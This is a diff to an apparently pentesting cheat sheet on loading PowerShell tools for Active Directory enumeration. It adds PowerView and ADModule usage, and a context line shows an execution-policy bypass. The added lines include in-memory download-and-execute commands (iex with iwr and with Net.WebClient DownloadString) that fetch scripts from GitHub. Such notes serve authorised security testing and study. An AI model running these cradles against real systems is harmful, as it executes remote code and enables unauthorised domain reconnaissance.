@@ -47,16 +47,32 @@ Powersehll -encodedcommand $env:PSExecutionPolicyPreference="bypass"
 
 &#x20;
 
-### Execute .PS1 File
+### Execute .PS1 File / PowerView
 
 . .\PowerView.ps1
+
+iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -UseBasicParsing)
+
+### Execute AD Module
+
+Download [https://github.com/samratashok/ADModule](https://github.com/samratashok/ADModule)
+
+Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose\
+Import-Module .\ActiveDirectory\ActiveDirectory.psd1
+
+iex (new-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory](https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1'\);Import-ActiveDirectory)
+
+To be able to list all the cmdlets in the module, import the module as well. Remember to import the DLL first.\
+Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose\
+Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1\
+Get-Command -Module ActiveDirectory
 
 ### Module
 
 Import a module/file\
 Import-Module \<modulepath>
 
-List all comamnds of a module:\
+List all commands of a module:\
 Get-Command -Module \<modulename>
 
 &#x20;
